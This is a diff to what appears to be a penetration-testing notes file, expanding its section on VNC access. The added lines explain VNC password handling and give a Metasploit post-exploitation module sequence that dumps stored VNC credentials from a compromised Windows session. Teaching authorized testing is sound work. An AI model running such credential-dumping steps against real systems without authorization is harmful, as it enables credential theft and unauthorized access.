@@ -407,7 +407,16 @@ VNC is used to get a screen for a remote host. But some of them have some exploi
 
 You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.
 
-It defaults to port 5900, so if the machine is using some other port 
+It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords
+
+```
+background
+use post/windows/gather/credentials/vnc
+set session X
+exploit
+```
+
+
 ```
 vncviewer 192.168.1.109
 ```
